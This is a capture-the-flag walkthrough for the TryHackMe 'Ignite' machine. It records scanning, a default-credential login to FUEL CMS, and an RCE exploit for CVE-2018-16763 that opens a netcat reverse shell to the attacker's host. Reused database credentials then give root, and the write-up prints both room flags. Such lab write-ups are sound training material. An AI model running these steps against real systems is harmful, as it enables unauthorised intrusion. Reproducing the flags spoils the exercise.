# Ignite Walkthrough - TryHackMe
Target OS: Ubuntu (Linux)
Target User Context: ```www-data $\rightarrow$ root```
Scope: CTF Documentation

## 1. Reconnaissance & Enumeration
1.1 Port & Service Scanning
- Vulnerability: Unsecured public HTTP interface running a vulnerable CMS version.
- Mechanism: Performed full service detection scan using Nmap.
- Command:
```bash
nmap -sV -sC -p- 10.48.189.119
```
- Result: Identified HTTP service active on port 80 running Apache httpd 2.4.18 (Ubuntu) with page title "Welcome to FUEL CMS".

1.2 Directory Brute-Forcing & Content Discovery
- Mechanism: Executed directory discovery via Gobuster and reviewed standard web crawler directives.
- Commands:
```bash
gobuster dir -u http://10.48.189.119 -w /usr/share/wordlists/dirb/common.txt
curl http://10.48.189.119/robots.txt
```
- Result: Discovered paths ```/assets```, ```/offline```, and a disallowed entry ```/fuel/``` inside ```robots.txt```.

## 2. Exploitation & Initial Access
2.1 Default Credential Authentication
- Vulnerability: Exposed default credentials on the application installation page.
- Mechanism: Inspected main web application landing page text, identifying default admin portal credentials (```admin / admin```).
- Execution: Navigated to ```[http://10.48.189.119/fuel/login](http://10.48.189.119/fuel/login)``` and logged in to access the FUEL CMS Dashboard interface.

2.2 Remote Code Execution (CVE-2018-16763)
- Vulnerability: Pre-auth / Post-auth Remote Code Execution in FUEL CMS 1.4.1 via input sanitization bypass in select parameters.
- Mechanism: Cloned an updated python exploit targeting CVE-2018-16763, initiated a Netcat listener, and triggered a reverse shell payload back to the attacker machine.
- Commands:
```bash
# Attacker terminal 1
nc -lvnp 1234

# Attacker terminal 2
python3 Fuel-Updated.py http://10.48.189.119/ 192.168.135.130 1234
```
- Result: Established initial shell session as ```www-data```.

## 3. Shell Stabilization & User Flag
3.1 Interactive PTY Spawn
- Mechanism: Upgraded standard non-interactive shell to a functional pseudo-terminal using Python.
- Command:
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```
3.2 User Flag Recovery
- Commands:
```bash
cd /home/www-data
cat flag.txt
```
- Result: ```6470e394cbf6dab6a91682cc8585059b```

## 4. Privilege Escalation
4.1 Internal Configuration & Credential Enumeration
- Vulnerability: Hardcoded plain-text database credentials matching system accounts.
- Mechanism: Executed SUID enumeration (```find / -perm -4000 2>/dev/null```), then inspected web application configuration files located in ```/var/www/html/fuel/application/config/database.php```.
- Commands:
```bash
cd /var/www/html/fuel/application/config
cat database.php
```
- Result: Identified hardcoded root database password within configuration array:
```bash
$db['default'] = array(
    'hostname' => 'localhost',
    'username' => 'root',
    'password' => 'mememe',
    'database' => 'fuel_schema',
    ...
);
```
4.2 System Privilege Elevation (su root)
- Mechanism: Used recovered database password ```mememe``` to switch account context to administrative ```root``` user via local login utility.
- Commands:
```bash
su root
# Password: mememe
whoami
cd /root
cat root.txt
```
- Result: Gained full ```root``` access and retrieved final system flag.
  - Root Flag: ```b9bcb33e11b80be759c4e844862482d```
## 5. Technical Summary
- Reconnaissance & Entry: Nmap and directory enumeration uncovered a FUEL CMS installation exposed on HTTP port 80.
- Initial Access: Default configuration disclosed credentials (```admin:admin```), while CVE-2018-16763 allowed execution of a Python RCE script delivering a ```www-data``` reverse shell.
- Privilege Escalation: Inspecting ```/var/www/html/fuel/application/config/database.php``` exposed the database root password (```mememe```), which was reused for administrative root access via ```su root```.
